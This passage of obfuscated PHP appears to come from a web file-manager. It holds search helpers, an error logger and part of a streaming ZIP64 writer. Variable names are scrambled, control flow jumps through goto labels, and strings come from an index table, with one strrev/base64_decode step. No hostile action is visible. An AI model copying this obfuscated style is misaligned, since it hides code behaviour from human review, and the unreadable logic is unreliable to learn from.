_listSearchTag(&$C‚¯ëĞˆ˜¶, $EŠ¾ÒˆŸŒÄ, $d ¯ ÀÕ) { goto FĞ³õóíÛ‰; dæ‹…ÇâÇ˜: $cÔ”Ûò¯ = array(); $EŠ‰¹“Ø‹· = $EŠ¾ÒˆŸŒÄ[$Dä‹îÕÒ [2148]]; foreach ($C‡µˆŸ´Ìæ as $B Ğ™¨‰¹„) { $cŒÃìãó‡… = $B Ğ™¨‰¹„[$Dä‹îÕÒ [28]]; $eÕ´ĞÔÆ = str_replace($Dä‹îÕÒ [50], $Dä‹îÕÒ [33], Pinyin::encode($cŒÃìãó‡…)); if (stripos($cŒÃìãó‡…, $EŠ‰¹“Ø‹·) !== !1 || stripos($eÕ´ĞÔÆ, $EŠ‰¹“Ø‹·) !== !1) { $cÔ”Ûò¯[] = $B Ğ™¨‰¹„[$Dä‹îÕÒ [363]]; } } goto cæÏ±•‰×ó; FĞ³õóíÛ‰: $Dä‹îÕÒ  =& $_SERVER[Ìó]; if (!$EŠ¾ÒˆŸŒÄ[$Dä‹îÕÒ [2148]] || $C‚¯ëĞˆ˜¶[$Dä‹îÕÒ [347]][$Dä‹îÕÒ [336]] > 1) { return; } $C‡µˆŸ´Ìæ = Model($Dä‹îÕÒ [2272])->listData(); goto dæ‹…ÇâÇ˜; BÀÔºÑÃ: $F×†ƒ¾ñæ = array_to_keyvalue($F×†ƒ¾ñæ, $Dä‹îÕÒ [33], $Dä‹îÕÒ [75]); $d—óÉ¥ºÔŸ = array_unique($F×†ƒ¾ñæ); $this->_listSearchMerge($C‚¯ëĞˆ˜¶, $EŠ¾ÒˆŸŒÄ, $d ¯ ÀÕ, $d—óÉ¥ºÔŸ); goto F—«Ëù›ç‡; cæÏ±•‰×ó: if (!$cÔ”Ûò¯) { return; } $cÑ¯àõİ¥‰ = array($Dä‹îÕÒ [389] => array($Dä‹îÕÒ [7], $cÔ”Ûò¯)); $F×†ƒ¾ñæ = Model($Dä‹îÕÒ [2273])->field($Dä‹îÕÒ [75])->where($cÑ¯àõİ¥‰)->select(); goto BÀÔºÑÃ; F—«Ëù›ç‡: } private function _listSearchDesc(&$B¼Öº°ø§§, $F±™Ûö³‘, $A÷˜¯Âò¥) { goto A°¹¦Ó‹ƒ; e‡˜ƒƒÆÜ: $AĞô§àÌ¼ = array_unique($AĞô§àÌ¼); if (!$AĞô§àÌ¼) { return; } $eˆñÍêãÖî = array($fìƒ¤ÉîÕ[365] => array($fìƒ¤ÉîÕ[7], $AĞô§àÌ¼), $fìƒ¤ÉîÕ[89] => $fìƒ¤ÉîÕ[400], $fìƒ¤ÉîÕ[355] => array($fìƒ¤ÉîÕ[747], $fìƒ¤ÉîÕ[2150] . $F±™Ûö³‘[$fìƒ¤ÉîÕ[2148]] . $fìƒ¤ÉîÕ[2150])); goto b¯Öììá¾÷; b¯Öììá¾÷: $c­× »¬™½ = Model($fìƒ¤ÉîÕ[499])->field($fìƒ¤ÉîÕ[365])->where($eˆñÍêãÖî)->select(); $BÕ»¨·ò¬¨ = array_to_keyvalue($c­× »¬™½, $fìƒ¤ÉîÕ[33], $fìƒ¤ÉîÕ[365]); $this->_listSearchMerge($B¼Öº°ø§§, $F±™Ûö³‘, $A÷˜¯Âò¥, $BÕ»¨·ò¬¨); goto eÏå…Ó»è; A°¹¦Ó‹ƒ: $fìƒ¤ÉîÕ =& $_SERVER[Ìó]; if (!$F±™Ûö³‘[$fìƒ¤ÉîÕ[2148]] || $B¼Öº°ø§§[$fìƒ¤ÉîÕ[347]][$fìƒ¤ÉîÕ[336]] > 1) { return; } $AĞô§àÌ¼ = $this->listSearchChildren($F±™Ûö³‘[$fìƒ¤ÉîÕ[456]]); goto e‡˜ƒƒÆÜ; eÏå…Ó»è: } private function _listSearchMerge(&$EËñÚÁÈâ, $b†ÈèˆĞ÷, $eÌ‹ßºñ‰, $côÃÉõéäŠ) { goto eÄŠÜ¬Ò”Ë; E°ÄëÛ‰Õ: $CÄ»“Ë¯Ş = array_diff($côÃÉõéäŠ, $D¸¥¡ÇÌ); if (!$CÄ»“Ë¯Ş) { return; } $bßæ¹çŠÊ× = array($C…¬‡Ì…òø[365] => array($C…¬‡Ì…òø[7], $CÄ»“Ë¯Ş)); goto DëÉ¼ù°“à; AÔ¹ï°ŸÏî: foreach ($e‡ÑÔÊÄ¡ô as $B³–¥”Ü ƒ) { $D§Éã¢’¦É = $C…¬‡Ì…òø[47] . $b†ÈèˆĞ÷[$C…¬‡Ì…òø[456]] . $C…¬‡Ì…òø[47]; if (stripos($B³–¥”Ü ƒ[$C…¬‡Ì…òø[454]], $D§Éã¢’¦É) !== !1) { $fÆ“Æ¢¦àò[] = $B³–¥”Ü ƒ; } } $EËñÚÁÈâ[$C…¬‡Ì…òø[350]] = array_merge($fÆ“Æ¢¦àò, $EËñÚÁÈâ[$C…¬‡Ì…òø[350]]); $EËñÚÁÈâ[$C…¬‡Ì…òø[347]][$C…¬‡Ì…òø[348]] += count($fÆ“Æ¢¦àò); goto AÃ¨ë—˜º‰; DëÉ¼ù°“à: $e‡ÑÔÊÄ¡ô = $this->field($eÌ‹ßºñ‰)->where($bßæ¹çŠÊ×)->select(); if (!$e‡ÑÔÊÄ¡ô) { return; } $fÆ“Æ¢¦àò = array(); goto AÔ¹ï°ŸÏî; eÄŠÜ¬Ò”Ë: $C…¬‡Ì…òø =& $_SERVER[Ìó]; if (!$côÃÉõéäŠ) { return; } $D¸¥¡ÇÌ = array_to_keyvalue($EËñÚÁÈâ[$C…¬‡Ì…òø[350]], $C…¬‡Ì…òø[33], $C…¬‡Ì…òø[365]); goto E°ÄëÛ‰Õ; AÃ¨ë—˜º‰: } public function listSearchChildren($FÃ…›ŠÅù¾, $aÆÙæË‹İê = 5000) { goto fíĞØ™•ç†; fíĞØ™•ç†: $Cë¹¹ˆÑİÈ =& $_SERVER[Ìó]; $B×’ˆ¤¿Æ = array(); $BÒ¬ˆµ›ÔÀ = $this->sourceInfo($FÃ…›ŠÅù¾); goto bÒß¾…ìÄø; bÒß¾…ìÄø: $BÄÍßÛôÈ‚ = array($Cë¹¹ˆÑİÈ[454] => array($Cë¹¹ˆÑİÈ[747], $BÒ¬ˆµ›ÔÀ[$Cë¹¹ˆÑİÈ[454]] . $BÒ¬ˆµ›ÔÀ[$Cë¹¹ˆÑİÈ[365]] . $Cë¹¹ˆÑİÈ[479])); $F¢ïµĞË¾¼ = $this->field($Cë¹¹ˆÑİÈ[365])->cache(null, 600)->where($BÄÍßÛôÈ‚)->count(); if ($F¢ïµĞË¾¼ > $aÆÙæË‹İê) { return $this->_listSearchChildrenNear($FÃ…›ŠÅù¾, $aÆÙæË‹İê); } goto bùĞ¯•ëË; bùĞ¯•ëË: $B“Â¤ŒÌõÒ = $this->field($Cë¹¹ˆÑİÈ[365])->where($BÄÍßÛôÈ‚)->select(); $B×’ˆ¤¿Æ = array_to_keyvalue($B“Â¤ŒÌõÒ, $Cë¹¹ˆÑİÈ[33], $Cë¹¹ˆÑİÈ[365]); return $B×’ˆ¤¿Æ; goto aßÃÀÓæ; aßÃÀÓæ: } private function _listSearchChildrenNear($F†Ã¹ºö¨ã, $F¼åÖ…éÖ“) { goto fÛ¡êà¤‹é; EÂØÈÀ…šÖ: if (!$BÅ°ÓœÌ§«) { return $cÌ‰ÏØğì; } $bÛˆ‘ğÏÚ = array($cèô‰çËøÑ[456] => array($cèô‰çËøÑ[7], $BÅ°ÓœÌ§«)); $DÌ¯¿ÈÃÌö = $this->field($cèô‰çËøÑ[2274])->where($bÛˆ‘ğÏÚ)->select(); goto BóÎ«‚¦; BóÎ«‚¦: $cÌ‰ÏØğì = array_merge($cÌ‰ÏØğì, array_to_keyvalue($DÌ¯¿ÈÃÌö, $cèô‰çËøÑ[33], $cèô‰çËøÑ[365])); $cÌ‰ÏØğì = array_slice($cÌ‰ÏØğì, 0, $F¼åÖ…éÖ“); return $cÌ‰ÏØğì; goto FÔ™õ˜‹Ù‹; fÛ¡êà¤‹é: $cèô‰çËøÑ =& $_SERVER[Ìó]; $cÌ‰ÏØğì = array(); $bÛˆ‘ğÏÚ = array($cèô‰çËøÑ[456] => $F†Ã¹ºö¨ã); goto aëñª³ö; aëñª³ö: $DÌ¯¿ÈÃÌö = $this->field($cèô‰çËøÑ[2274])->where($bÛˆ‘ğÏÚ)->select(); $BÅ°ÓœÌ§« = array_to_keyvalue(array_filter_by_field($DÌ¯¿ÈÃÌö, $cèô‰çËøÑ[366], $cèô‰çËøÑ[83]), $cèô‰çËøÑ[33], $cèô‰çËøÑ[365]); $cÌ‰ÏØğì = array_merge($cÌ‰ÏØğì, array_to_keyvalue($DÌ¯¿ÈÃÌö, $cèô‰çËøÑ[33], $cèô‰çËøÑ[365])); goto EÂØÈÀ…šÖ; FÔ™õ˜‹Ù‹: } private function _listSearchBindPinyin($e‰¥ƒƒÊ‚Ù, &$AÑÀõ›Œµ, &$Aöƒ‘×š…) { goto DÇÛ¢¼ó…ê; a÷Üïõª¿¶: $a¶÷ÒŒ« = array(); $Aöƒ‘×š… = str_replace(array($FŞ°®«‘[213], $FŞ°®«‘[50], $FŞ°®«‘[2275]), $FŞ°®«‘[33], $Aöƒ‘×š…); $Aöƒ‘×š… = $FŞ°®«‘[2276] . str_replace($FŞ°®«‘[47], $FŞ°®«‘[2277], $Aöƒ‘×š…); goto dãÕÉ‰»â; dãÕÉ‰»â: unset($AÑÀõ›Œµ[$FŞ°®«‘[28]]); foreach ($AÑÀõ›Œµ as $eï‹²îÑ“ => $b©ˆêõ¯å) { $a¶÷ÒŒ«[$FŞ°®«‘[2276] . $eï‹²îÑ“] = $b©ˆêõ¯å; } $EËÓ¨´ê‘ = array($FŞ°®«‘[478], $FŞ°®«‘[2150] . $e‰¥ƒƒÊ‚Ù[$FŞ°®«‘[2148]] . $FŞ°®«‘[2150]); goto dÕ™æÈÓ•; dÕ™æÈÓ•: $a¶÷ÒŒ«[] = array($FŞ°®«‘[2278] => $EËÓ¨´ê‘, $FŞ°®«‘[912] => $FŞ°®«‘[2152], array($FŞ°®«‘[2279] => $EËÓ¨´ê‘, $FŞ°®«‘[2280] => array($FŞ°®«‘[7], array($FŞ°®«‘[411], $FŞ°®«‘[410])))); $this->join($AŒÀ•¨‡Ä); $AÑÀõ›Œµ = $a¶÷ÒŒ«; goto aÉÉİËØ«í; DÇÛ¢¼ó…ê: $FŞ°®«‘ =& $_SERVER[Ìó]; if (!Input::check($e‰¥ƒƒÊ‚Ù[$FŞ°®«‘[2148]], $FŞ°®«‘[302]) || strlen($e‰¥ƒƒÊ‚Ù[$FŞ°®«‘[2148]]) < 2) { return; } $AŒÀ•¨‡Ä = "\114\105\x46\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x73\x6f\165\162\143\x65\x5f\155\145\x74\141\x20\x6d\145\x74\x61\40\157\x6e\x20\x73\x6f\x75\x72\143\145\x2e\x73\x6f\x75\162\143\x65\x49\x44\40\x3d\40\x6d\145\164\141\x2e\x73\x6f\x75\x72\x63\145\111\x44"; goto a÷Üïõª¿¶; aÉÉİËØ«í: } private function _parseSearchWhere($BË•ƒõ–‡½) { goto FÇîƒÛèµğ; Dõ„¦­ùÄÌ: if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[530]])) { $C¯éç©•Õ†[] = array($CŒ§±Êõ[375] => $BË•ƒõ–‡½[$CŒ§±Êõ[530]], $CŒ§±Êõ[374] => $BË•ƒõ–‡½[$CŒ§±Êõ[530]], $CŒ§±Êõ[912] => $CŒ§±Êõ[2152]); } if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[368]])) { $bµÙ‡éİ¨’ = $BË•ƒõ–‡½[$CŒ§±Êõ[368]]; if ($bµÙ‡éİ¨’ == $CŒ§±Êõ[76]) { $C¯éç©•Õ†[$CŒ§±Êõ[366]] = 1; } else { if ($bµÙ‡éİ¨’ == $CŒ§±Êõ[2286]) { $C¯éç©•Õ†[$CŒ§±Êõ[366]] = 0; } else { if ($bµÙ‡éİ¨’) { $bµÙ‡éİ¨’ = is_array($bµÙ‡éİ¨’) ? $bµÙ‡éİ¨’ : explode($CŒ§±Êõ[47], $bµÙ‡éİ¨’); $C¯éç©•Õ†[$CŒ§±Êõ[368]] = array($CŒ§±Êõ[380], $bµÙ‡éİ¨’); $C¯éç©•Õ†[$CŒ§±Êõ[366]] = 0; } } } } if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[456]])) { $F±Æ»á±ŞÔ = $this->sourceInfo($BË•ƒõ–‡½[$CŒ§±Êõ[456]]); $C¯éç©•Õ†[$CŒ§±Êõ[520]] = array($CŒ§±Êõ[478], $F±Æ»á±ŞÔ[$CŒ§±Êõ[454]] . $BË•ƒõ–‡½[$CŒ§±Êõ[456]] . $CŒ§±Êõ[479]); } goto Cõœ•œ•Òí; FÇîƒÛèµğ: $CŒ§±Êõ =& $_SERVER[Ìó]; $C¯éç©•Õ† = array(); if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[698]])) { $C¯éç©•Õ†[$CŒ§±Êõ[106]] = array($CŒ§±Êõ[2281], $BË•ƒõ–‡½[$CŒ§±Êõ[698]]); } goto cÔŞë—ù´¹; Cõœ•œ•Òí: if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[2148]]) && $BË•ƒõ–‡½[$CŒ§±Êõ[2148]]) { $b‘Ñ¬”İê = $BË•ƒõ–‡½[$CŒ§±Êõ[2148]]; $A¸ñâ´Ÿá = explode($CŒ§±Êõ[50], $b‘Ñ¬”İê); if (strlen($b‘Ñ¬”İê) > 2 && (substr($b‘Ñ¬”İê, 0, 1) == $CŒ§±Êõ[112] && substr($b‘Ñ¬”İê, -1) == $CŒ§±Êõ[112]) || substr($b‘Ñ¬”İê, 0, 1) == $CŒ§±Êõ[55] && substr($b‘Ñ¬”İê, -1) == $CŒ§±Êõ[55]) { $b‘Ñ¬”İê = substr($b‘Ñ¬”İê, 1, -1); $A¸ñâ´Ÿá = array($b‘Ñ¬”İê); } $C¯éç©•Õ†[$CŒ§±Êõ[28]] = array($CŒ§±Êõ[478], $CŒ§±Êõ[2150] . $b‘Ñ¬”İê . $CŒ§±Êõ[2150]); if (count($A¸ñâ´Ÿá) > 1) { $C¯éç©•Õ†[$CŒ§±Êõ[28]] = array(); foreach ($A¸ñâ´Ÿá as $eè‚Û—­âï) { if (!trim($eè‚Û—­âï)) { continue; } $C¯éç©•Õ†[$CŒ§±Êõ[28]][] = array($CŒ§±Êõ[478], $CŒ§±Êõ[2150] . trim($eè‚Û—­âï) . $CŒ§±Êõ[2150]); } } } return $C¯éç©•Õ†; goto B„ÏâÄÂ˜; cÔŞë—ù´¹: if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[699]])) { $B‘ÊèÏ®÷Ó = array($CŒ§±Êõ[2282], $BË•ƒõ–‡½[$CŒ§±Êõ[699]]); if ($C¯éç©•Õ†[$CŒ§±Êõ[106]]) { $C¯éç©•Õ†[$CŒ§±Êõ[106]] = array($C¯éç©•Õ†[$CŒ§±Êõ[106]], $B‘ÊèÏ®÷Ó, $CŒ§±Êõ[2283]); } else { $C¯éç©•Õ†[$CŒ§±Êõ[106]] = $B‘ÊèÏ®÷Ó; } } if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[2284]])) { $C¯éç©•Õ†[$CŒ§±Êõ[77]] = array($CŒ§±Êõ[2281], $BË•ƒõ–‡½[$CŒ§±Êõ[2284]]); } if (isset($BË•ƒõ–‡½[$CŒ§±Êõ[2285]])) { $B‘ÊèÏ®÷Ó = array($CŒ§±Êõ[2282], $BË•ƒõ–‡½[$CŒ§±Êõ[2285]]); if ($C¯éç©•Õ†[$CŒ§±Êõ[77]]) { $C¯éç©•Õ†[$CŒ§±Êõ[77]] = array($C¯éç©•Õ†[$CŒ§±Êõ[77]], $B‘ÊèÏ®÷Ó, $CŒ§±Êõ[2283]); } else { $C¯éç©•Õ†[$CŒ§±Êõ[77]] = $B‘ÊèÏ®÷Ó; } } goto Dõ„¦­ùÄÌ; B„ÏâÄÂ˜: } } goto C÷Ñİê½œÌ; Eê¸‚ï¾Í : function beforeShutdownError($dˆÒñ†õ´Á = false, $E’…İøôğ´ = '', $bõ¨¸à = '', $AÑõÊíªñ² = 0) { $F„Ü‡Õò =& $_SERVER[†˜ı]; switch ($dˆÒñ†õ´Á) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $a«ƒˆ…±ƒæ = $F„Ü‡Õò[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $a«ƒˆ…±ƒæ = $F„Ü‡Õò[40]; break; case E_STRICT: $a«ƒˆ…±ƒæ = $F„Ü‡Õò[41]; break; case E_NOTICE: case E_USER_NOTICE: $a«ƒˆ…±ƒæ = $F„Ü‡Õò[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $a«ƒˆ…±ƒæ = $F„Ü‡Õò[43]; break; default: break; } if (!$a«ƒˆ…±ƒæ || $a«ƒˆ…±ƒæ == $F„Ü‡Õò[42] || $a«ƒˆ…±ƒæ == $F„Ü‡Õò[43]) { return; } $bõ¨¸à = $F„Ü‡Õò[4] . str_replace($_SERVER[$F„Ü‡Õò[37]], $F„Ü‡Õò[20], $bõ¨¸à); $aÑáÎáÓ”Ì = $a«ƒˆ…±ƒæ . $F„Ü‡Õò[44] . $E’…İøôğ´ . $F„Ü‡Õò[44] . $bõ¨¸à . $F„Ü‡Õò[44] . $AÑõÊíªñ²; write_log($aÑáÎáÓ”Ì . $F„Ü‡Õò[18] . get_caller_msg(1), $F„Ü‡Õò[19]); } $_SERVER[$_SERVER[†˜ı][45]] = $_SERVER[$_SERVER[†˜ı][37]] . $_SERVER[†˜ı][46]; $CØÁÀÍ¨æ = strrev(base64_decode($_SERVER[†˜ı][47])); goto E°„Æ¸®³«; BÉç‘÷ñ—ñ: class ZipMake { const VERSION = "\x30\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($aŠ…„…®¬† = null) { $dÎ†ôÇí¬ =& $_SERVER[Ìó]; $this->outputStream = fopen($dÎ†ôÇí¬[1977], $dÎ†ôÇí¬[1214]); $this->outputName = $aŠ…„…®¬†; $this->needHeaders = !0; } public function addFile($d¯ŞˆØ«¥è, $C±§·Ù…í) { goto cËµÜÎÎí; dŸÚéšà: $f…µé´ß›« = $this->addFileHeader($d¯ŞˆØ«¥è, $e¼ÎµÙæéÖ); $a©ëœÛ°ßõ = $e‰¾øóĞò = filesize($C±§·Ù…í); $F¯—Íñæ– = fopen($C±§·Ù…í, $EÈ£ô»ãŠ”[1978]); goto E¨ëãØ°š¶; E¨ëãØ°š¶: while (!feof($F¯—Íñæ–)) { $f›¨šÏ¶Å = fread($F¯—Íñæ–, 1048576); $this->send($f›¨šÏ¶Å); } fclose($F¯—Íñæ–); $E¹ƒ‰ƒ·ï = hexdec(hash_file($EÈ£ô»ãŠ”[1979], $C±§·Ù…í)); goto AŒªˆËø„; AŒªˆËø„: $this->addFileFooter($d¯ŞˆØ«¥è, $e¼ÎµÙæéÖ, $E¹ƒ‰ƒ·ï, $a©ëœÛ°ßõ, $e‰¾øóĞò, $f…µé´ß›«); goto bš©˜¤Ş›; cËµÜÎÎí: $EÈ£ô»ãŠ” =& $_SERVER[Ìó]; $d¯ŞˆØ«¥è = $this->filterFilename($d¯ŞˆØ«¥è); $e¼ÎµÙæéÖ = static::METHOD_STORE; goto dŸÚéšà; bš©˜¤Ş›: } public function addFileFromStream($CÀ¬Ñõ‰Ü½, $C¬Î“˜Åïä) { goto Aªã´÷œåŒ; BË¨˜ñ®‰Ø: $this->addFileFooter($CÀ¬Ñõ‰Ü½, $E·œÛ™ĞŞ, $F¾ÑŞ¿¸Ùï, $b¼—‘Š¤Ô, $F‰Çæ•øÂ, $câ¦±¡ğóË); goto eŠ³ö–÷´¡; Aˆ¿Ö®±Ö£: $AŸÜ©°¼ƒ” = hash_init($_SERVER[Ìó][1979]); while (!feof($C¬Î“˜Åïä)) { $Aõƒº‘Øƒä = fread($C¬Î“˜Åïä, 1048576); hash_update($AŸÜ©°¼ƒ”, $Aõƒº‘Øƒä); $this->send($Aõƒº‘Øƒä); } $F¾ÑŞ¿¸Ùï = hexdec(hash_final($AŸÜ©°¼ƒ”)); goto BË¨˜ñ®‰Ø; bØ¹İ×„ç: fseek($C¬Î“˜Åïä, 0, SEEK_END); $b¼—‘Š¤Ô = $F‰Çæ•øÂ = ftell($C¬Î“˜Åïä); rewind($C¬Î“˜Åïä); goto Aˆ¿Ö®±Ö£; Aªã´÷œåŒ: $CÀ¬Ñõ‰Ü½ = $this->filterFilename($CÀ¬Ñõ‰Ü½); $E·œÛ™ĞŞ = static::METHOD_STORE; $câ¦±¡ğóË = $this->addFileHeader($CÀ¬Ñõ‰Ü½, $E·œÛ™ĞŞ); goto bØ¹İ×„ç; eŠ³ö–÷´¡: } public function finish() { foreach ($this->files as $AÉ„•…‚—¡) { $this->addCdrFile($AÉ„•…‚—¡); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($dìµ †™¶, $cìßëŞÓ»ß) { goto eè±·ñÜà; eè±·ñÜà: $e ”ê¾ğğ =& $_SERVER[Ìó]; $dìµ †™¶ = preg_replace($e ”ê¾ğğ[1980], $e ”ê¾ğğ[33], $dìµ †™¶); $e‚¡à×…¡á = strlen($dìµ †™¶); goto d‹˜—Ä¸Ç; FëêŞî®¸Â: return strlen($dÇ¸’‡‹) + $e‚¡à×…¡á + strlen($B‰ØğŒö¯); goto Dù×´¸¡´õ; d‹˜—Ä¸Ç: $DÂöÃóÌÔ = $this->dosTime(time()); $fô‚º¿ŞØ = array(array($e ”ê¾ğğ[1981], static::FILE_HEADER_SIGNATURE), array($e ”ê¾ğğ[1982], static::ZIP_VERSION_64), array($e ”ê¾ğğ[1982], 8), array($e ”ê¾ğğ[1982], $cìßëŞÓ»ß), array($e ”ê¾ğğ[1981], $DÂöÃóÌÔ), array($e ”ê¾ğğ[1981], 0), array($e ”ê¾ğğ[1981], 4294967295), array($e ”ê¾ğğ[1981], 4294967295), array($e ”ê¾ğğ[1982], $e‚¡à×…¡á), array($e ”ê¾ğğ[1982], 32)); $DëÌğÒŒŸœ = array(array($e ”ê¾ğğ[1982], 1), array($e ”ê¾ğğ[1982], 28), array($e ”ê¾ğğ[1983], 0), array($e ”ê¾ğğ[1983], 0), array($e ”ê¾ğğ[1983], 0), array($e ”ê¾ğğ[1981], 0)); goto F™ïà‡ó’; F™ïà‡ó’: $dÇ¸’‡‹ = $this->packFields($fô‚º¿ŞØ); $B‰ØğŒö¯ = $this->packFields($DëÌğÒŒŸœ); $this->send($dÇ¸’‡‹ . $dìµ †™¶ . $B‰ØğŒö¯); goto FëêŞî®¸Â; Dù×´¸¡´õ: } protected function addFileFooter($Aø”Ü¬š“Û, $FŒ…Û„Î¼Ë, $fì¤Ş£×Ú…, $cãŸŸ˜Ò™Ü, $d™Ôğå†», $fÑœêôßà¿) { $A¢Æ“‡Éô¥ =& $_SERVER[Ìó]; $aŒ¢¼ç…»÷ = array(array($A¢Æ“‡Éô¥[1981], static::DATA_DESCRIPTOR_SIGNATURE), array($A¢Æ“‡Éô¥[1981], $fì¤Ş£×Ú…), array($A¢Æ“‡Éô¥[1983], $cãŸŸ˜Ò™Ü), array($A¢Æ“‡Éô¥[1983], $d™Ôğå†»)); $f¦·õ£ùÆ® = $this->packFields($aŒ¢¼ç…»÷); $this->send($f¦·õ£ùÆ®); $f»‘¬­è¿ = $fÑœêôßà¿ + $cãŸŸ˜Ò™Ü + $aµµ†¡Ê²; $this->addToCdr($Aø”Ü¬š“Û, $FŒ…Û„Î¼Ë, $fì¤Ş£×Ú…, $cãŸŸ˜Ò™Ü, $d™Ôğå†», $f»‘¬­è¿); } private function addToCdr($bæî÷Ü¸Ú, $dÅßÚ£Úøé, $cÃ½êæÇ¨Æ, $dÙÚÅà‚ÌÌ, $F±¶ÑŠ‡‹ô, $bÍàÏˆÛ·ƒ) { $this->files[] = array($bæî÷Ü¸Ú, $dÅßÚ£Úøé, $cÃ½êæÇ¨Æ, $dÙÚÅà‚ÌÌ, $F±¶ÑŠ‡‹ô, $this->ofs); $this->ofs += $bÍàÏˆÛ·ƒ; } protected function addCdrFile($FÄ†ÂŒÉ©) { goto DíêãÜÌˆ; A¦¶à¤Ï©¨: $BÙ²åÌë®à = $this->packFields($c˜Î£âùĞ£); $eò•Ù½”ö½ = $this->packFields($C…àÈ†‡ÆÄ); $Bï¨Ê—É¢Æ = $BÙ²åÌë®à . $eë´¦ø . $båŸóÅ¿Ç‹ . $eò•Ù½”ö½; goto aßõ‘Ôã; DíêãÜÌˆ: $E™ÄÓ•¾˜™ =& $_SERVER[Ìó]; list($eë´¦ø, $bŠ‘Ô äÜÀ, $CÚ‰©£»è‹, $FÃ·‹ê¾‰, $EÇÉá¼Êó³, $Cã³ğÏÚ) = $FÄ†ÂŒÉ©; $båŸóÅ¿Ç‹ = $E™ÄÓ•¾˜™[33]; goto Eš«ŒØó¸; aßõ‘Ôã: $this->send($Bï¨Ê—É¢Æ); $this->cdr_ofs += strlen($Bï¨Ê—É¢Æ); goto c‡‘ßå¬÷; Eš«ŒØó¸: $C®¢ ÓóËµ = $this->dosTime(time()); $c˜Î£âùĞ£ = array(array($E™ÄÓ•¾˜™[1981], static::CDR_FILE_SIGNATURE), array($E™ÄÓ•¾˜™[1982], static::ZIP_VERSION_64), array($E™ÄÓ•¾˜™[1982], static::ZIP_VERSION_64), array($E™ÄÓ•¾˜™[1982], 8), array($E™ÄÓ•¾˜™[1982], $bŠ‘Ô äÜÀ), array($E™ÄÓ•¾˜™[1981], $C®¢ ÓóËµ), array($E™ÄÓ•¾˜™[1981], $CÚ‰©£»è‹), array($E™ÄÓ•¾˜™[1981], 4294967295), array($E™ÄÓ•¾˜™[1981], 4294967295), array($E™ÄÓ•¾˜™[1982], strlen($eë´¦ø)), array($E™ÄÓ•¾˜™[1982], 32), array($E™ÄÓ•¾˜™[1982], strlen($båŸóÅ¿Ç‹)), array($E™ÄÓ•¾˜™[1982], 0), array($E™ÄÓ•¾˜™[1982], 0), array($E™ÄÓ•¾˜™[1981], 32), array($E™ÄÓ•¾˜™[1981], 4294967295)); $C…àÈ†‡ÆÄ = array(array($E™ÄÓ•¾˜™[1982], 1), array($E™ÄÓ•¾˜™[1982], 28), array($E™ÄÓ•¾˜™[1983], $EÇÉá¼Êó³), array($E™ÄÓ•¾˜™[1983], $FÃ·‹ê¾‰), array($E™ÄÓ•¾˜™[1983], $Cã³ğÏÚ), array($E™ÄÓ•¾˜™[1981], 0)); goto A¦¶à¤Ï©¨; c‡‘ßå¬÷: } protected function addCdr64Eof() { goto c—ØŒ»œ®; aŠ¹öÎ›÷õ: $C¢³‹µÁ„Ø = $this->ofs; $Eõ Œ“·Ö™ = array(array($f«¯ŠŞøºº[1981], static::ZIP64_CDR_EOF_SIGNATURE), array($f«¯ŠŞøºº[1983], 44), array($f«¯ŠŞøºº[1982], static::ZIP_VERSION_64), array($f«¯ŠŞøºº[1982], static::ZIP_VERSION_64), array($f«¯ŠŞøºº[1981], 0), array($f«¯ŠŞøºº[1981], 0), array($f«¯ŠŞøºº[1983], $BÊŠÂ¡ô›²), array($f«¯ŠŞøºº[1983], $BÊŠÂ¡ô›²), array($f«¯ŠŞøºº[1983], $cÌã ÷Ó‘¿), array($f«¯ŠŞøºº[1983], $C¢³‹µÁ„Ø)); $e”×ìÔîĞÍ = $this->packFields($Eõ Œ“·Ö™); goto e›õìŒÆÃ; c—ØŒ»œ®: $f«¯ŠŞøºº =& $_SERVER[Ìó]; $BÊŠÂ¡ô›² = count($this->files); $cÌã ÷Ó‘¿ = $this->cdr_ofs; goto aŠ¹öÎ›÷õ; e›õìŒÆÃ: $this->send($e”×ìÔîĞÍ); goto f†¤ïƒãåŠ; f†¤ïƒãåŠ: } protected function addCdr64Locator() { goto d›ØÒ•˜Óâ; cµƒë¡Ÿ«Å: $this->send($f¶‡¦ºŠŠÜ); goto C½††ñÃŸô; d›ØÒ•˜Óâ: $dĞˆÌ†Ê§ =& $_SERVER[Ìó]; $e‘„í¥ù = count($this->files); $dŠ›îÁ¦Éƒ = $this->cdr_ofs; goto aõŸÁ’¢œ; aõŸÁ’¢œ: $bš¤Îõ†Ûõ = $this->ofs; $FŒ„À–÷ô· = array(array($dĞˆÌ†Ê§[1981], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($dĞˆÌ†Ê§[1981], 0), array($dĞˆÌ†Ê§[1983], $bš¤Îõ†Ûõ + $dŠ›îÁ¦Éƒ), array($dĞˆÌ†Ê§[1981], 1)); $f¶‡¦ºŠŠÜ = $this->packFields($FŒ„À–÷ô·); goto cµƒë¡Ÿ«Å; C½††ñÃŸô: } protected function addCdrEof() { goto A®ùº£­ßä; A®ùº£­ßä: $bÍ„¡Ë¡Ğ‚ =& $_SERVER[Ìó]; $fº§ˆ—Ó¯” = count($this->files); $c„”ôÉ•«Æ = $this->cdr_ofs; goto Có¯½š—; Có¯½š—: $Dïã÷½×ß¿ = $this->ofs; $EŞ‡•äÔŞ— = 